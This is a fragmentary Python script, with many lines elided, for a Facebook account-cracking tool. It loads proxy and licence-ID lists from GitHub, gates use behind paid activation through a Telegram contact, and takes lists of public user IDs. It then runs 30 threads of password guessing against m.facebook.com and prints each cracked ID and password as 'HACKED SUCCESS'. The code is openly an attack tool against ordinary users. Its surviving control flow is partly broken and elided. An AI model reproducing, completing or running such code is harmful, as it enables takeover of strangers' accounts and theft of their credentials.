...
princp=[]
try:
	prox= requests.get('https://raw.githubusercontent.com/rohman-TI/proxy/main/prox.txt').text
...
def chk():
  ...
  try:
    httpCaht = requests.get("https://raw.githubusercontent.com/Darothisdiv/sarxosh/main/ID.txt").text
    if id in httpCaht:
      ...
      print("\x1b[91mBarezm Id kat active nya Tkaya bo Active krdn nama bnera bo telegram @sarxoshm ")
      os.system('xdg-open  @badchenal')
      time.sleep(1) 
      sys.exit() 
  except: 
    sys.exit() 
...
def uaku():
	try:
		...
		a=requests.get('https://raw.githubusercontent.com/Kaewankarzan/SHEXAV3.py/main/ID.txt').text
		ua=open('.bbnew.txt','w')
...
def menu(id):
	...
	print('\x1b[36;1m[ 1 ] = Cracking From Public ID ')
	print('\x1b[36;1m[ 0 ] = Exit ')
	print('\x1b[37;1m>>>>>>>>>>>>>>>>>>>>>>>>>>>\x1b[0m')
	_____alvino__adijaya_____ = input('\033[1;97m Choice: ')
	print('')
...
def dump_massal():
	...
	try:
		...
		exit()
	if jum<1 or jum>100:
		print('\x1b[1;93m[\x1b[1;92m!\x1b[1;93m]\x1b[1;93m ╰─>\x1b[1;92meror Dump ID ')
		exit()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1
		kl = input('\033[1;97m PASTE ID : ')
		uid.append(kl)
	for userr in uid:
		try:
	...
	try:
		print('')
		print(f'\033[1;97m All Id :  {h}'+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{x}')
		print('\x1b[1;93m[\x1b[1;92m!\x1b[1;93m]\x1b[1;93m ╰─>\x1b[1;92mSinyal Anda Kurang Bagus Nih !')
		...
		back()
def setting():
	print('\033[1;97m [1] = Method b-api')
	print('')
	hu = input('\033[1;97m Choice: ')
	print('')
	if hu in ['1','01']:
		...
		print('\x1b[1;93m[\x1b[1;92m+\x1b[1;93m]\x1b[1;93m ╰─>\x1b[1;92mPilih Yang Bener Kak !')
		exit()
	print('\033[1;97m [1] = M.facebook.com ')
	print('')
	hc = input('\033[1;97m Choice: ')
	print('')
	if hc in ['1','01']:
		...
		method.append('mobile')
	print('\x1b[1;97m===============================')
	print('\x1b[37;1mCRACKING START PLEASE WAIT UNTIL END....')
	print('\n\x1b[36;1m Auth : QUTA ')
	print('\x1b[1;97m===============================')	
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			...
			if 'mobile' in method:
				...
				pool.submit(crackfree,idf,pwv)
	print('')
	print(f'{h}HACKED SUCCESS:%s '%(ok))
	print(f' {M}ACCOUNT ON CHKPOINT: %s '%(cp))
	woi = input('')
	if woi in ['y','Y']:
		back()
	else:
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{Z}[QUTA]{P} {Z}[{Z}{loop}{Z}/{Z}{len(id)}{Z}]—{Z}[{H}{ok}{Z}]—[{M}{cp}{Z}]—[{bo}{'{:.0%}'.format(loop/float(len(id)))}{Z}]  "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				print(f'==============' + '\n\x1b[37;1m QUTA OK\x1b[0m' + '\n\x1b[32;1m[  ID  ]  : \x1b[37;1m' + idf + '\n\x1b[32;1m[ PASS ] : \x1b[37;1m' + pw + '\x1b[37;1m\n==============' + '\n \x1b[37;1m')
